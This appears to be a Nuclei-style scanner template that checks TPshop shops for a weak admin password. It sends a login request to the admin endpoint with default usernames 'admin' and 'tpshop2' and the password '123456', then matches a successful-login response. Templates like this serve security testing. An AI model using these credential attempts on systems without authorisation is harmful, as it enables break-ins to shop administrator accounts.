id: poc-yaml-tpshop-weak-password

info:
  name: TPshop Weak Password Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: weak-password
  description: |
    This template detects weak password vulnerabilities in TPshop admin login.

http:
  - raw:
      - |
        POST /index.php?m=Admin&c=Admin&a=login&t=0.4782945532557282 HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8

        username={{user}}&password={{password}}

    payloads:
      user:
        - admin
        - tpshop2
      password:
        - 123456

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: regex
        regex:
          - '"status":1'
          - '"url":'
      - type: word
        words:
          - "<"
        negative: true
